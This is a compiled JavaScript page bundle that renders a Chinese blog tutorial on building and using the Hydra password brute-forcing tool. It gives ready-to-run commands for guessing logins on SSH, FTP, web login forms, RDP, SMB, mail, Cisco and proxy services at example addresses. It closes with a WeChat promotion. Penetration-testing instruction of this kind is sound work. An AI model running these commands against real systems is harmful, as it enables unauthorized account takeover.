(window.webpackJsonp=window.webpackJsonp||[]).push([[280],{572:function(s,a,e){"use strict";e.r(a);var n=e(7),t=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"破解工具hydra安装与使用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#破解工具hydra安装与使用"}},[s._v("#")]),s._v(" 破解工具hydra安装与使用")]),s._v(" "),a("p",[s._v("注：大家可以到链接"),a("a",{attrs:{href:"https://download.csdn.net/download/l1028386804/10902002",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://download.csdn.net/download/l1028386804/10902002"),a("OutboundLink")],1),s._v(" 下载Hydra一键安装包，内含冰河亲做一键安装脚本，直接运行即可。")]),s._v(" "),a("p",[a("strong",[s._v("说明：")]),s._v(" hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。官网：http://www.thc.org/thc-hydra，可支持AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP等类型密码。 这款暴力密码破解工具相当强大，支持几乎所有协议的在线密码破解，其密码能否被破解关键在于字典是否足够强大。对于社会工程型渗透来说，有时能够得到事半功倍的效果。本文仅从安全角度去探讨测试，请勿用于非法事件。")]),s._v(" "),a("p",[a("strong",[s._v("安装：")]),s._v(" 1.yum安装相应依赖包")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# yum install openssl-devel pcre-devel ncpfs-devel postgresql-devel libssh-devel subversion-devel libncurses-devel\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("2.hydra编译安装")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# cd /usr/local/src\n# wget http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz\n# tar zxf hydra-6.3-src.tar.gz\n# cd hydra-6.3-src\n# ./configure\n# make\n# make install\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[a("strong",[s._v("参数：")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]\n[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]\n-R 继续从上一次进度接着破解。\n-S 采用SSL链接。\n-s PORT 可通过这个参数指定非默认端口。\n-l LOGIN 指定破解的用户，对特定用户破解。\n-L FILE 指定用户名字典。\n-p PASS 小写，指定密码破解，少用，一般是采用密码字典。\n-P FILE 大写，指定密码字典。\n-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。\n-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。\n-M FILE 指定目标列表文件一行一条。\n-o FILE 指定结果输出文件。\n-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。\n-t TASKS 同时运行的线程数，默认为16。\n-w TIME 设置最大超时的时间，单位秒，默认是30s。\n-v / -V 显示详细过程。\nserver 目标ip\nservice 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。\nOPT 可选项\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br")])]),a("p",[a("strong",[s._v("使用：")]),s._v(" 1.手动创建用户名字典和密码字典，这里只是为了演示，只加了几个用户名和弱口令。真正破解时，需要利用密码字典生成器生成强大的字典")]),s._v(" "),a("p",[s._v("2.破解ssh：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.8 ssh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("破解成功，直接显示结果。也可以使用 -o 选项指定结果输出文件。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra -L users.txt -P password.txt -t 1 -vV -e ns -o save.log 192.168.1.104 ssh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("其它实例：")]),s._v(" "),a("p",[s._v("1.破解ssh：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh\n# hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("2.破解ftp：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV\n# hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("3.get方式提交，破解web登录：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/\n# hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("4.post方式提交，破解web登录：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('# hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"\n# hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:wrong username or password"\n（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("5.破解https：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("6.破解teamspeak：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("7.破解cisco：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra -P pass.txt 10.36.16.18 cisco\n# hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("8.破解smb：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra -l administrator -P pass.txt 10.36.16.18 smb\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("9.破解pop3：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra -l muts -P pass.txt my.pop3.mail pop3\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("10.破解rdp：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra ip rdp -l administrator -P pass.txt -V\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("11.破解http-proxy：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra -l admin -P pass.txt http-proxy://10.36.16.18\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("12.破解imap：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# hydra -L user.txt -p secret 10.36.16.18 imap PLAIN\n# hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN\n此工具强大之处远多于以上测试，其密码能否破解关键在于强大的字典，对于社工型渗透来说，有时能够得到事半功倍的效果\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("strong",[s._v("附录：")]),s._v(" 附录1:hydra: error while loading shared libraries: libssh.so.4: cannot open shared object file: No such file or directory 如果是ubuntu系统的话，直接apt-get install cmake libssl-dev就可以了。但我系统的centOS，没有找到libssl-dev这东西。因为手#动编译了libssh")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("# yum install cmake\n# cd /usr/local/src\n# wget http://www.libssh.org/files/0.4/libssh-0.4.8.tar.gz\n# tar zxf libssh-0.4.8.tar.gz\n# cd libssh-0.4.8\n# mkdir build\n# cd build\n# cmake -DCMAKE_INSTALL_PREFIX=/usr -DCMAKE_BUILD_TYPE=Debug -DWITH_SSH1=ON ..\n# make\n# make install\n# /sbin/ldconfig  //要执行这句，不然会出现hydra: error while loading shared libraries: libssh.so.4: cannot open shared object file: No such file or directory\n\n# cd /usr/local/src\n# wget http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz\n# tar zxf hydra-6.3-src.tar.gz\n# cd hydra-6.3-src\n# ./configure\n# make\n# make install\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br")])]),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),a("blockquote",[a("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=t.exports}}]);